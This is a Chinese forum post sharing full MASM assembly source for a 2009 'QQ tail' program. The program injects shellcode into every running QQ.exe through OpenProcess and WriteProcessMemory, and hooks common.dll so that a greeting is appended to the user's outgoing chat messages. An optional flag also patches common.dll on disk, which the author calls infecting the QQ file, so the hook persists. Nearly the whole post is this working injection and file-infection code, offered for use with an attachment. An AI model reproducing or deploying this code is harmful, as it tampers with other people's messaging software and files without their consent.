
# 【源码】09 年写的 QQ 尾巴，现在还能用【支持 2008 版以上，国际版也可以用】

> 原文：[`www.pediy.com/kssd/pediy11/124085.html`](https://www.pediy.com/kssd/pediy11/124085.html)

那时候还是初学汇编，所以写的代码还很搓，将就下看看吧！  

代码：



```
.386
.model flat, stdcall
option casemap :none

include windows.inc
include user32.inc
include kernel32.inc
include masm32.inc
include gdi32.inc
include shlwapi.inc

includelib gdi32.lib
includelib shlwapi
includelib user32.lib
includelib kernel32.lib
includelib masm32.lib
include macro.asm
    MemSearch PROTO : DWORD,:DWORD,:DWORD,:DWORD
    ZjSearch  PROTO : DWORD,:DWORD,:DWORD,:DWORD,:DWORD
    GetModuleAddr Proto:DWORD,:DWORD
    HookQQChat  Proto:DWORD,:DWORD
    AnsiToUnicode proto:DWORD
    UnicodeToUtf8 proto:DWORD
    AnsiToUtf8  proto:DWORD
    UniCodeLen  proto:DWORD
    StartProc proto
.data
      Zl db 255, 210, 137, 93, 16, 139, 78, 76, 141, 69, 16, 80 
      Code db 131, 248, 1, 15, 133, 210, 0, 0, 0, 96
         \_   db 139, 69, 236, 139, 64, 12, 139, 72, 4 
         \_\_   db 129, 249, 1, 77, 83, 71, 116, 18, 139, 72, 16, 129, 249
         \_\_\_   db 0, 77, 83, 71, 15, 133, 176, 0, 0, 0, 131, 192, 12, 129, 120, 41 
         \_\_\_\_   db 9, 1, 0, 1, 15, 132, 160, 0, 0, 0, 128, 120, 252, 2, 15, 132, 150, 0, 0, 0 
         \_\_\_\_\_  db 128, 120, 42, 2, 15, 132, 140, 0, 0, 0, 51, 201, 249, 114, 4, 102, 135, 88, 43 
         \_\_\_\_\_\_  db 102, 139, 80, 43, 134, 242, 102, 185, 101, 0, 102, 3, 209, 134, 242, 102, 137, 80
         \_\_\_\_\_\_\_ db 43, 131, 251, 0, 139, 209, 81, 139, 72, 40, 116, 13, 134, 214, 102, 137, 80, 43, 134
         \_\_\_\_\_\_\_\_  db 214, 131, 194, 3, 51, 201, 134, 205, 102, 3, 209, 134, 214, 102, 137, 80, 40, 131, 233, 3
         \_\_\_\_\_\_\_\_\_  db 119, 2, 51, 201, 129, 225, 255, 255, 0, 0, 141, 124, 8, 45, 89, 232, 0, 0, 0, 0, 88, 131, 192, 63
         \_\_\_\_\_\_\_\_\_\_  db 139, 240, 81, 243, 164, 89, 139, 69, 236, 131, 251, 0, 116, 5, 134, 251, 102, 43, 203, 102, 1, 72, 4
         \_\_\_\_\_\_\_\_\_\_\_  db 139, 64, 12, 139, 80, 4, 129, 250, 1, 77, 83, 71, 116, 13, 139, 80, 5, 134, 242, 102, 3, 209, 134, 242
         \_\_\_\_\_\_\_\_\_\_\_\_  db 137, 80, 5, 97, 137, 93, 16, 139, 78, 76, 195, 144
      Codelen dd 227 ;也可以用 Codelen-Code 得出
      posBuffer db 10 dup (0)
      ModAddr dd ?
      ModName db "common.dll",0
      QQ     db "QQ.exe",0
      Call\_   db  232
      ADDR\_   dd ?
      NOP\_    db 144
      STR\_    db  13,10,"我衷心的祝福大家在新的一年里工作顺利;心想事成;万事如意!",13,10
      STR\_\_   db      "2010 年新年快乐~\\()/~",13,10
      STR\_\_\_  db        "            BY: Dream Flyer",0
      Wjgr    db 0        ;如果为 1 表示感染 QQ 文件,下次运行自己发作
      szModulePath db 256 dup(?)
       ModulePath db 256 dup(?)
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>已经解除硬编码
                ;BY: Dream Flyer
                ;EMail:mxxgt@vip.qq.com
.data?

   

.CODE
START:     
;<<<<<<<<<<<<<<<<<<<<<<<<<<<<
invoke StartProc        ;||
invoke ExitProcess,0     ;||
;<<<<<<<<<<<<<<<<<<<<<<<<<<<<
StartProc proc 
       LOCAL  info:PROCESSENTRY32
        LOCAL  handle:HANDLE
        invoke CreateToolhelp32Snapshot,TH32CS\_SNAPPROCESS,0 ;进程快照
        mov    handle,eax
        mov    info.dwSize,sizeof PROCESSENTRY32
        invoke Process32First,handle,addr info
     .repeat
        invoke lstrcmpi,addr info.szExeFile,addr QQ ;比较是否为我们要找的进程名，不区分大小写
        .if !eax
              invoke HookQQChat, info.th32ProcessID,addr STR\_;挂钩每个 QQ 程序
;             invoke wsprintf, addr posBuffer,CTXT("%d"),info.th32ProcessID ;转化成文本
;            invoke MessageBoxA,0,addr posBuffer,CTXT("地址:"),MB\_OK
        .endif
        invoke Process32Next,handle,addr info
      .until !eax
      invoke CloseHandle,handle
      ret
StartProc endp

HookQQChat proc PID,ChatText
local Rpid,HookAddr,Utf8,Utf8Len,CodeAddr,NullData,AllLen,Bh\_,Openf:OFSTRUCT,Hfile
 invoke OpenProcess, 2035711, 0, PID  ;PROCESS\_ALL\_ACCESS 全部权限
  .if eax == 0 ;打开进程失败
     jmp exit\_
  .endif
   mov Rpid,eax;保存句柄
   invoke GetModuleAddr,PID,addr ModName
  add eax,1000H
  mov ModAddr,eax
  invoke MemSearch,PID,addr Zl, ModAddr,12 ;:<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<12 是 ZL 长度
          ;  invoke wsprintf, addr posBuffer,CTXT("%lX"),eax ;转化成文本
          ;  invoke MessageBoxA,0,addr posBuffer,CTXT("地址:"),MB\_OK
  mov HookAddr,eax
            xor ax,ax
            cmp eax,0
            mov eax,2  ;返回值
            je exit\_ ; 地址太小,说明没成功
  add HookAddr,2  ;地址加 2
  invoke GlobalAlloc,GMEM\_FIXED,Codelen
  .if eax!=0
      mov CodeAddr,eax
      invoke RtlMoveMemory,CodeAddr,addr Code,Codelen
      invoke AnsiToUtf8,ChatText
      mov Utf8,eax
      invoke lstrlen,eax;<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<硬编码后,删除些代码
      mov Utf8Len,eax;<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<此处硬编码,可以防止别人修改 AX 的值为内容长度
      mov ecx,CodeAddr
      push ecx
      add ecx,95
      mov WORD ptr \[ecx\],ax;<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<硬编码后,删除些代码
      pop ecx
      add ecx,Codelen
      invoke RtlMoveMemory,ecx,Utf8,Utf8Len
      mov eax,Codelen
      add eax,Utf8Len
      mov AllLen,eax
      push eax
      invoke GlobalAlloc,GMEM\_FIXED,eax
      pop ecx
      push eax
      invoke RtlZeroMemory,eax,ecx
      pop eax
      invoke MemSearch,PID,eax, ModAddr,AllLen
      mov NullData,eax
            xor ax,ax
            cmp eax,0
            mov eax,3 ;返回值
            je exit\_ ; 地址太小,说明没成功
      add NullData,2 ;地址加 2
      invoke VirtualProtectEx,Rpid,NullData,AllLen,4,addr Bh\_  
      cmp eax,0
      mov eax,5;返回值
      je exit\_
      invoke WriteProcessMemory,Rpid,NullData,CodeAddr,AllLen,addr Bh\_
      xor eax,eax
      mov eax,4 ;返回值
      sub Bh\_,2
      jb end\_\_ ;没有写入成功
      invoke VirtualProtectEx,Rpid, HookAddr, 6, 4, addr Bh\_
      mov eax,NullData
      sub eax,HookAddr
      sub eax,5       ;计算相对地址
      mov ADDR\_,eax
      invoke WriteProcessMemory,Rpid,HookAddr,addr Call\_, 6, addr Bh\_
      xor eax,eax
      inc eax ;返回值
      sub Bh\_,2
      jb end\_\_ ;没有写入成功
      .if Wjgr==1 ;QQ 文件感染代码
        invoke PathFileExists,addr szModulePath;文件存在,说明感染过了
        .if eax
             invoke MoveFile,addr ModulePath,addr szModulePath
            invoke CopyFile,addr szModulePath,addr ModulePath,0
            invoke OpenFile,addr ModulePath,addr Openf,OF\_READWRITE
            mov Hfile,eax
            mov eax,NullData
            and eax,0ffffffH ;
            invoke SetFilePointer ,Hfile,eax,NULL,FILE\_BEGIN
            invoke WriteFile,Hfile,CodeAddr,AllLen,addr Bh\_,NULL
            mov eax,HookAddr
            and eax,0ffffffH
            invoke SetFilePointer ,Hfile,eax,NULL,FILE\_BEGIN
            invoke WriteFile,Hfile,addr Call\_ ,6,addr Bh\_,NULL
            invoke CloseHandle,Hfile
           
        .endif
         
      .endif
  .endif   
end\_\_:
  push eax
invoke CloseHandle,Rpid
   pop eax
   exit\_:ret
HookQQChat endp

AnsiToUnicode proc Ansi
local len,UnicodeAddr
invoke MultiByteToWideChar,936,0,Ansi,-1,0,0
shl eax,1 ;相当于乘 2
mov len,eax
invoke GlobalAlloc,GMEM\_FIXED,len
  .if eax!=0
    mov UnicodeAddr,eax
    invoke MultiByteToWideChar ,936, 0, Ansi, -1, eax, len
    mov eax,UnicodeAddr
  .endif
ret
AnsiToUnicode endp
;<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<UnicodeToUtf8
UnicodeToUtf8 proc Unicode
local utf8\_len
invoke UniCodeLen,Unicode
invoke WideCharToMultiByte,65001, 0, Unicode, eax, 0, 0, 0, 0
mov utf8\_len,eax
invoke GlobalAlloc,GMEM\_FIXED,eax
push eax
invoke WideCharToMultiByte,65001, 0, Unicode, -1, eax, utf8\_len, 0, 0
pop eax
ret
UnicodeToUtf8 endp
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
AnsiToUtf8 Proc Ansi
      invoke AnsiToUnicode,Ansi
      invoke UnicodeToUtf8,eax
ret
AnsiToUtf8 endp

UniCodeLen proc uses ebx Unicode
  xor     eax, eax
  mov ecx,\[ebp+8H\]
L001:
  cmp     WORD ptr \[ecx\], 0
  je L011
  inc     eax
  xor     ebx, ebx
  mov     bx, WORD ptr \[ecx\]
  cmp     bh, 0
  je L009
  inc     eax
L009:
  add     ecx, 2
  jmp L001
L011:
 ret
UniCodeLen endp
;===================================================================================搜索进程内存
  MemSearch proc PID,TXT,Start,TXTlen
  local Rpid,DataBuff,Wz
  local Men:MEMORY\_BASIC\_INFORMATION
  invoke OpenProcess, 2035711,0, PID  ;取得操作句柄
  .if eax != 0
      mov Rpid,eax;保存句柄
      @1:
      invoke VirtualQueryEx, Rpid,Start,addr Men,28 ;取得内存块信息
          .if eax != 0
            invoke GlobalAlloc,GMEM\_FIXED,Men.RegionSize
                .if eax != 0 ;申请成功
                   mov DataBuff,eax ;申请内存地址
                    invoke ReadProcessMemory ,Rpid,Start,eax,Men.RegionSize ,0 ;读取内存
                            .if eax!=0 ;有数据
                              invoke ZjSearch, DataBuff,TXT,1,Men.RegionSize, TXTlen;寻找字符串
                                    .if eax!=-1 ;找到了
                                       mov Wz,eax ;找到位置
                                       invoke CloseHandle, Rpid ;关闭句柄
                                       mov eax,Wz
                                       add eax,Start
                                       dec eax  ;找到位置减 1
                                       jmp END\_ ;找到后就返回
                                    .endif
                                .else
                                add ax,3 ;EAX=3 错误代码
                                .endif
                                 
                        .else
                        ;申请内存失败
                        add ax,2 ;EAX=2 错误代码
                        .endif
                 mov eax,Men.RegionSize
                  add Start,eax ;起始地址 ＝ 起始地址 ＋ 内存块信息.大小
                  jmp @1 ;循环搜索
                 .else
                    add ax,4;EAX=4 错误代码
                   .endif   
                    
    .else
        inc eax  ;EAX=1 错误代码
  .endif
  push eax
  invoke CloseHandle, Rpid ;关闭句柄
  pop eax
  END\_:ret
MemSearch endp
;==============================================================================================
    ZjSearch proc uses edi esi edx ebx Zj1,Zj2,Start,leng1,leng2; 搜索字节集
      mov     edi,  \[ebp+8H\]
      test    edi, edi
      je L059
      mov     ebx,  \[ebp+14H\]
      cmp     ebx, 0
      jle L059
      mov     edx,  edi
      mov     esi,  \[ebp+0CH\]
      test    esi, esi
      je L059
      mov     ecx,  \[ebp+18H\]
      cmp     ecx, 0
      jle L059
      mov     eax, esi
      mov     \[ebp-0CH\], eax
      mov     eax,  \[ebp+10H\]
      dec     eax
      cmp     eax, 0
      jge L022
      xor     eax, eax
    L022:
      mov     \[ebp+10H\], eax
      sub     ebx, eax
      cmp     ecx, ebx
      jg L059
      dec     ecx
      mov     \[ebp-8\], ecx
      sub     ebx, ecx
      mov     \[ebp-4\], ebx
      add     edx, eax
    L031:
      mov     esi, \[ebp-0CH\]
      mov     edi, edx
      mov     ecx, ebx
      mov     ah, \[esi\]
      inc     esi
    L036:
      jecxz L059
      mov     al,  \[edi\]
      inc     edi
      dec     ecx
      xor     al, ah
      jnz L036
      mov     edx, edi
      mov     ebx, ecx
      mov     ecx,  \[ebp-8H\]
      jecxz L055
L046:    mov     ah,  \[esi\]
      mov     al,  \[edi\]
      inc     esi
      inc     edi
      xor     al, ah
      jnz L031
      dec     ecx
      jecxz L055
      jmp L046
L055:    mov     eax,  \[ebp+10H\]
      add     eax,  \[ebp-4H\]
      sub     eax, ebx
      jmp     end\_
L059:    or      eax, 0FFFFFFFFH
      end\_:ret
    ZjSearch endp
;==============================================================================搜索字节集结束
      GetModuleAddr proc PID,ModNameAddr ;<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<取进程内模块地址
      local Snapshot:HANDLE,Module:MODULEENTRY32
      invoke CreateToolhelp32Snapshot,8,PID
        .if eax == 0
          jmp End\_
        .endif
        mov Module.dwSize,sizeof MODULEENTRY32
        mov Snapshot,eax ;保存快照句柄
        invoke Module32First,Snapshot,addr Module
        @3:cmp eax,0
        je  @2
          invoke lstrcmpi,ModNameAddr,addr Module.szModule
          .if!eax
            invoke lstrlen, addr Module.szModule
            push eax
            invoke lstrlen, addr Module.szExePath
            pop ecx
            sub eax,ecx ;目录长度
            push eax
            invoke RtlZeroMemory,addr szModulePath,200H;清空内容先
            mov eax,\[esp\]
            invoke RtlMoveMemory,addr szModulePath,addr Module.szExePath,eax
            invoke lstrlen, addr Module.szExePath
            invoke RtlMoveMemory,addr ModulePath,addr Module.szExePath,eax
            pop ecx
            mov eax,offset szModulePath
            add eax,ecx
            invoke RtlMoveMemory,eax,CTXT("Dream Flyer.dll"),15
;            invoke MessageBox,NULL,addr szModulePath,CTXT("123"),MB\_OK
;            invoke MessageBox,NULL,addr   ModulePath,CTXT("123"),MB\_OK
             mov eax,Module.hModule ;模块地址
            jmp End\_
          .endif
          invoke Module32Next,Snapshot,addr Module
          jmp @3
      @2:invoke CloseHandle,Snapshot
      End\_:ret
      GetModuleAddr endp
;===================================================================取模块地址结束
end START
```



上传的附件

| `![](img/0623e01110d741fd20f66acbc8ec6f9d.jpg)` || `QQ 尾巴.rar` |
